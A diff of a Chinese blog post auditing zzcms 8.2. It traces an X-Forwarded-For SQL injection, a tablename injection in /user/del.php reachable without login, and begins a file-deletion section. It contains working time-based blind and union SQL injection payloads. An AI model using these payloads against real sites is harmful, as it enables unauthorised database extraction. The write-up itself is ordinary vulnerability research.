+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /user/check.php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">"PassWord"</span>]))&#123; <span class="comment">// cookie中要有 UserName PassWord</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='/user/login.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/user/del.php</code>文件的开头包含了和<code>/inc/conn.php</code>和<code>/user/check.php</code>文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"../inc/conn.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>继续看<code>/user/check.php</code>文件。当验证用户登录后，会进入 else 语句，里面一共有5处 sql 语句。看一下第一处：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username=nostr($_COOKIE[<span class="string">"UserName"</span>]);</span><br><span class="line">$rs=query(<span class="string">"select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='"</span>.$username.<span class="string">"' and password='"</span>.$_COOKIE[<span class="string">"PassWord"</span>].<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>函数 nostr() 定义在<code>/inc/stopsqlin.php</code>文件中，过滤了一些非法字符，如<code>&#39;</code>、<code>/</code>、<code>\</code>等。<br>这句查询里 username 和 password 取自请求头中的 Cookie 字段，但是前面讲了<code>/inc/stopsqlin.php</code>文件中对 $_COOKIE 中的单引号进行了转义，所以无法闭合这句查询的单引号。<br>看一下第二处：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录IP</span></span><br></pre></td></tr></table></figure>
+
+<p>看一下 getip() 函数，定义在<code>/inc/function.php</code>中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 100</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">$ip = <span class="string">"unknown"</span>; </span><br><span class="line"><span class="keyword">return</span>($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>该函数获取用户的 ip，这里 ip 可以从请求头中的 X-Forwarded-For 字段 中取到，并且没有对取出来的 ip 做任何处理，就直接拼接到第二处 sql 查询中。<br>我们先在<code>/user/login.php</code>页面中注册一个账号，账号和密码都是 admin。登录后，看一下 zzcms_user 表中的 loginip 字段的值：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/01.png" alt="01"></p>
 <p>抓包后我们添加 X-Forwarded-For 字段：</p>
@@ -395,34 +148,54 @@
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/05.png" alt="05"></p>
 <p>取消 vscode 监听，因为 burp 的响应时间是根据调试的时间返回的，单独 burp 发包看一下响应时间：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/06.png" alt="06"></p>
-<p>看一下<code>/user/check.php</code>中剩下的3个 sql 查询：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strtotime(date(<span class="string">"Y-m-d H:i:s"</span>))-strtotime($lastlogintime)&gt;<span class="number">3600</span>*<span class="number">24</span>)&#123;</span><br><span class="line">    query(<span class="string">"UPDATE zzcms_user SET totleRMB = totleRMB+"</span>.jf_login.<span class="string">" WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//登录时加积分</span></span><br><span class="line">    query(<span class="string">"insert into zzcms_pay (username,dowhat,RMB,mark,sendtime) values('"</span>.$username.<span class="string">"','每天登录用户中心送积分','+"</span>.jf_login.<span class="string">"','','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br><span class="line">&#125;</span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET lastlogintime = '"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录时间</span></span><br></pre></td></tr></table></figure></p>
-<p>jf_login 是一个常量，定义在<code>/inc/config.php</code>中。而其他部分也不可控，所以这三句查询无法利用。<br>上面的注入发生在访问<code>/user/del.php</code>文件时，进入了<code>/user/check.php</code>发生了注入。实际上在<code>/user/del.php</code>文件中也存在注入。<br>在包含了<code>/user/check.php</code>文件后，<code>/user/del.php</code>文件接收了 post 中的三个参数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">        checkid($_POST[<span class="string">'id'</span>][$i]);</span><br><span class="line">        $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>该文件从 post 数组中取出了 pagename、tablename、id，并对 id 调用了 checkid() 进行处理。该函数定义在<code>/inc/function.php</code>中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 49</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkid</span><span class="params">($id,$classid=<span class="number">0</span>,$msg=<span class="string">''</span>)</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span> ($id&lt;&gt;<span class="string">''</span>)&#123; </span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id)==<span class="keyword">false</span>)&#123;showmsg(<span class="string">'参数 '</span>.$id.<span class="string">' 有误！相关信息不存在'</span>);&#125; </span><br><span class="line">    <span class="keyword">elseif</span> ($id&gt;<span class="number">100000000</span>)&#123;showmsg(<span class="string">'参数超出了数字表示范围！系统不与处理。'</span>);&#125;<span class="comment">//因为clng最大长度为9位</span></span><br><span class="line">    <span class="keyword">if</span> ($classid==<span class="number">0</span>)&#123;<span class="comment">//查大小类ID时这里设为1</span></span><br><span class="line">        <span class="keyword">if</span> ($id&lt;<span class="number">1</span>)&#123;showmsg(<span class="string">'参数有误！相关信息不存在。\r\r提示：'</span>.$msg);&#125;<span class="comment">//翻页中有用,这个提示msg在其它地方有用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里对 id 进行检查，我们无法控制 id 进行注入。<br>继续往下看<code>/user/del.php</code>，是一个 switch 的判断：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($tablename) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"zzcms_main"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"zzcms_licence"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>该 switch 判断不存在 sql 注入的点。继续往下看：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($tablename==<span class="string">'zzcms_guestbook'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($tablename==<span class="string">'zzcms_dlly'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from zzcms_dl where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from zzcms_dl where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $rs=query($sql);</span><br><span class="line">    $row=num_rows($rs);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看一下<code>/user/check.php</code>中剩下的3个 sql 查询：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strtotime(date(<span class="string">"Y-m-d H:i:s"</span>))-strtotime($lastlogintime)&gt;<span class="number">3600</span>*<span class="number">24</span>)&#123;</span><br><span class="line">    query(<span class="string">"UPDATE zzcms_user SET totleRMB = totleRMB+"</span>.jf_login.<span class="string">" WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//登录时加积分</span></span><br><span class="line">    query(<span class="string">"insert into zzcms_pay (username,dowhat,RMB,mark,sendtime) values('"</span>.$username.<span class="string">"','每天登录用户中心送积分','+"</span>.jf_login.<span class="string">"','','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br><span class="line">&#125;</span><br><span class="line">query(<span class="string">"UPDATE zzcms_user SET lastlogintime = '"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);<span class="comment">//更新最后登录时间</span></span><br></pre></td></tr></table></figure>
+
+<p>jf_login 是一个常量，定义在<code>/inc/config.php</code>中。而其他部分也不可控，所以这三句查询无法利用。<br>上面的注入发生在访问<code>/user/del.php</code>文件时，进入了<code>/user/check.php</code>发生了注入。实际上在<code>/user/del.php</code>文件中也存在注入。<br>在包含了<code>/user/check.php</code>文件后，<code>/user/del.php</code>文件接收了 post 中的三个参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">        checkid($_POST[<span class="string">'id'</span>][$i]);</span><br><span class="line">        $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该文件从 post 数组中取出了 pagename、tablename、id，并对 id 调用了 checkid() 进行处理。该函数定义在<code>/inc/function.php</code>中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 49</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkid</span><span class="params">($id,$classid=<span class="number">0</span>,$msg=<span class="string">''</span>)</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span> ($id&lt;&gt;<span class="string">''</span>)&#123; </span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id)==<span class="keyword">false</span>)&#123;showmsg(<span class="string">'参数 '</span>.$id.<span class="string">' 有误！相关信息不存在'</span>);&#125; </span><br><span class="line">    <span class="keyword">elseif</span> ($id&gt;<span class="number">100000000</span>)&#123;showmsg(<span class="string">'参数超出了数字表示范围！系统不与处理。'</span>);&#125;<span class="comment">//因为clng最大长度为9位</span></span><br><span class="line">    <span class="keyword">if</span> ($classid==<span class="number">0</span>)&#123;<span class="comment">//查大小类ID时这里设为1</span></span><br><span class="line">        <span class="keyword">if</span> ($id&lt;<span class="number">1</span>)&#123;showmsg(<span class="string">'参数有误！相关信息不存在。\r\r提示：'</span>.$msg);&#125;<span class="comment">//翻页中有用,这个提示msg在其它地方有用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里对 id 进行检查，我们无法控制 id 进行注入。<br>继续往下看<code>/user/del.php</code>，是一个 switch 的判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($tablename) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"zzcms_main"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"zzcms_licence"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该 switch 判断不存在 sql 注入的点。继续往下看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($tablename==<span class="string">'zzcms_guestbook'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($tablename==<span class="string">'zzcms_dlly'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from zzcms_dl where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,saver from zzcms_dl where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $rs=query($sql);</span><br><span class="line">    $row=num_rows($rs);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>这里 tablename 我们可控，当其值不等于 zzcms_guestbook 和 zzcms_dlly 时，便进入到 else 分支中，在该分支中，未对 tablename 进行处理，便拼接进了 sql 查询中。<br>但是因为 tablename 是从 post 数组中取出来的，而前面说到在<code>/inc/stopsqlin.php</code>中对数据进行了过滤。过滤步骤如下：</p>
 <ol>
 <li>先调用 trim() 去除数据首尾处的空白字符。</li>
 <li>再调用 htmlspecialchars() 将<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&gt;</code>、<code>&lt;</code>抓换为 html 实体。</li>
 <li>最后调用 addslashes() 用反斜线<code>\</code>对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>null</code>进行转义。 </li>
 </ol>
-<p>而在拼接 tablename 时不用闭合引号，这里可以使用时间盲注。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">zzcms_dl where id = 1 and if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br><span class="line">zzcms_dl where id = 1 and if(ascii((substr((select database()), 1, 1)) = 122), benchmark(1000000,sha1(1)), 1); #</span><br><span class="line">zzcms_dl where id = 1 and case when (ascii(substr((select database()), 1, 1)) = 122) then sleep(6) else 1 end; #</span><br></pre></td></tr></table></figure></p>
+<p>而在拼接 tablename 时不用闭合引号，这里可以使用时间盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">zzcms_dl where id = 1 and if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br><span class="line">zzcms_dl where id = 1 and if(ascii((substr((select database()), 1, 1)) = 122), benchmark(1000000,sha1(1)), 1); #</span><br><span class="line">zzcms_dl where id = 1 and case when (ascii(substr((select database()), 1, 1)) = 122) then sleep(6) else 1 end; #</span><br></pre></td></tr></table></figure>
+
 <p>接下来复现一下，记得 post 中要传入 id 的值，不然在<code>/user/del.php</code>对 id 的判断中会执行 exit()。id 如果传入的不是数组，则需要以数字 1-9 开头，如果传入的是数组，则每个元素的范围是 1&lt;= id &lt;=100000000。<br>因为查询语句是用 and 连接，所以如果前面的查询中没有返回信息，则 and 起到短路作用，之后的 payload 就不会执行了。<br>为了测试我们直接向 zzcms_dl 表中插入一行数据：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/07.png" alt="07"></p>
 <p>vscode 下断点跟一下：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/08.png" alt="08"></p>
 <p>可以看到数据拼接进 sql 查询语句了。直接 burp 看一下响应：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/09.png" alt="09"></p>
-<p>可以看到 payload 生效了。<br>这里其实不用注册前台用户，也可以实现注入，再看一次<code>/user/del.php</code>开头包含的<code>/user/check.php</code>文件，该文件主要对用户的身份进行了验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">"PassWord"</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='/user/login.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到如果 cookie 中没有存储登录信息，会通过改变 location.href 的值跳转到登录页面，但是因为这是 js 的脚本，且没有执行 exit() 或 die() 等函数，所以<code>/user/del.php</code>之后的脚本会继续执行，任然会产生注入。<br>但是上面的 payload 是有条件的，即<code>zzcms_dl</code>表中要有数据，换成其他表也一样。所以我们可以通过 union 注入实现取消的该条件的限制。可以看到该注入点原本是要查询 id 和 editor 这两个字段的值，所以 union 中要有两个占位符 1 和 2。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">zzcms_dl where id = 2 union select 1,2 and if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br><span class="line">zzcms_dl where id = 2 union select 1,if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br></pre></td></tr></table></figure></p>
+<p>可以看到 payload 生效了。<br>这里其实不用注册前台用户，也可以实现注入，再看一次<code>/user/del.php</code>开头包含的<code>/user/check.php</code>文件，该文件主要对用户的身份进行了验证。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">"PassWord"</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='/user/login.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到如果 cookie 中没有存储登录信息，会通过改变 location.href 的值跳转到登录页面，但是因为这是 js 的脚本，且没有执行 exit() 或 die() 等函数，所以<code>/user/del.php</code>之后的脚本会继续执行，任然会产生注入。<br>但是上面的 payload 是有条件的，即<code>zzcms_dl</code>表中要有数据，换成其他表也一样。所以我们可以通过 union 注入实现取消的该条件的限制。可以看到该注入点原本是要查询 id 和 editor 这两个字段的值，所以 union 中要有两个占位符 1 和 2。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">zzcms_dl where id = 2 union select 1,2 and if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br><span class="line">zzcms_dl where id = 2 union select 1,if((ascii(substr(database(),1,1)) = 122), sleep(6), 1); #</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/10.png" alt="10"></p>
 <p>该 payload 同样可以实现 sql 注入。</p>
 <h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>相关目录：<br>/user：前台注册用户相关的目录。<br>/inc：网站所需包含的各种文件的存放目录。<br>/admin：默认后台管理目录。</p>
 <p>继续用前面注册的用户，账号密码都是 admin。<br>用户登录后，看一下<code>/user/adv.php</code>页面，用户可以在该页面添加或修改广告信息。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/11.png" alt="11"></p>
-<p>该页面对应的文件前两行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"../inc/conn.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>该页面对应的文件前两行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"../inc/conn.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>
+
 <p>前面讲了/user/check.php<code>是验证登录信息的文件。</code>/inc/conn.php<code>是连接数据库的文件，该文件中包含了另一个</code>/inc/stopsqlin.php<code>文件，对 get、post、cookie 中的数据进行了过滤。
